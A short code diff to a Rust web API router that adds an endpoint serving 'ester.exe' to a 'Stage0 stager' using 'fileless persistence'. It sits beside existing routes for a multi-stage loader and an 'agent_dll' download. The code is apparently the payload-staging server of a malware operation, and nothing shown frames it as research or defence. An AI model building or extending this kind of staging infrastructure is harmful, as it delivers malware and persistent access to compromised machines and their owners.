@@ -68,6 +68,8 @@ pub fn create_api_router(state: Arc<ApiState>) -> Router {
         // Stage1 endpoints for stage0-lite multi-stage pipeline
         .route("/api/stage1/lite", get(handlers::download_stage0_lite))
         .route("/api/stage1/agent_dll", get(handlers::download_agent_dll))
+        // Stage0 stager: fileless persistence downloads ester.exe from here
+        .route("/api/stage0/ester", get(handlers::download_ester))
         .layer(cors)
         .with_state(state)
 }
